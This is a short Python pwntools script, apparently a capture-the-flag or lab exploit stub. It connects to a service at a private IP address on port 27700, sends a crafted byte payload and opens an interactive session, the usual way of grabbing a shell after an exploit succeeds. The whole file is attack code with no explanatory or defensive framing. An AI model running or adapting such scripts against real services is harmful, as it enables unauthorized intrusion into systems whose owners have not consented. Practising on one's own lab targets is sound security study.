#!/usr/bin/python
# -*- coding: UTF-8 -*-

from pwn import *

context.log_level = "debug"

p = remote("192.168.245.135", 27700)

p.send("\x00\xaa" * 8)
# p.recvall()
p.interactive()
